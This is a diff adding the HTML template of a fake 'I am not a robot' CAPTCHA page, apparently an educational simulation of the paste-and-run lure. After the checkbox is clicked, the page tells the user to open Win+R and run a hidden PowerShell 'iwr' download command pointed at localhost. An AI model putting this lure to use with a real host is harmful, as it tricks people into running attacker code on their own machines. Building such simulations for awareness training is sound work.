@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verify you are human</title>
+  <link rel="stylesheet" href="/style.css" />
+</head>
+<body>
+  <div class="edu-banner">Educational simulation</div>
+
+  <main class="card" id="card" data-state="<%= state.state %>">
+    <img class="logo" src="/captcha.png" alt="logo" />
+
+    <h1 class="title">Verify you are human</h1>
+    <p class="subtitle">Complete the check to continue.</p>
+
+    <div class="checkbox-row" id="checkboxRow">
+      <button class="checkbox" id="checkbox" aria-label="Verify"></button>
+      <span class="checkbox-label">I am not a robot</span>
+      <span class="spinner" id="spinner" hidden></span>
+    </div>
+
+    <section class="instructions" id="instructions" hidden>
+      <h2 class="instructions-title">Verification required</h2>
+      <p class="instructions-sub">Follow the steps below to complete verification.</p>
+      <ol class="steps">
+        <li>Press <kbd>Win</kbd> + <kbd>R</kbd></li>
+        <li>Paste the code with <kbd>Ctrl</kbd> + <kbd>V</kbd></li>
+        <li>Press <kbd>Enter</kbd></li>
+      </ol>
+      <div class="code-box" id="codeBox">powershell -w hidden -c "iwr http://127.0.0.1:3000 -UseBasicParsing"</div>
+    </section>
+
+    <section class="waiting" id="waiting" hidden>
+      <span class="spinner big"></span>
+      <p class="waiting-text">Waiting for verification to complete…</p>
+    </section>
+
+    <p class="edu-note">This page is a simulation. Nothing is executed.</p>
+  </main>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const card = document.getElementById('card');
+    const checkbox = document.getElementById('checkbox');
+    const spinner = document.getElementById('spinner');
+    const instructions = document.getElementById('instructions');
+    const waiting = document.getElementById('waiting');
+    const checkboxRow = document.getElementById('checkboxRow');
+
+    let checked = false;
+
+    function render(state) {
+      card.dataset.state = state;
+      if (state === 'idle') {
+        checkboxRow.hidden = false;
+        instructions.hidden = true;
+        waiting.hidden = true;
+        spinner.hidden = true;
+        checkbox.classList.remove('checked');
+        checked = false;
+      } else if (state === 'armed') {
+        checkboxRow.hidden = false;
+        checkbox.classList.add('checked');
+        spinner.hidden = true;
+        instructions.hidden = false;
+        waiting.hidden = true;
+      } else if (state === 'connected') {
+        checkboxRow.hidden = true;
+        instructions.hidden = true;
+        waiting.hidden = false;
+        window.location.href = '/complete';
+      }
+    }
+
+    checkbox.addEventListener('click', async () => {
+      if (checked) return;
+      checked = true;
+      spinner.hidden = false;
+      await fetch('/verify/check', { method: 'POST' });
+    });
+
+    const socket = io();
+    socket.on('state', (s) => render(s.state));
+  </script>
+</body>
+</html>
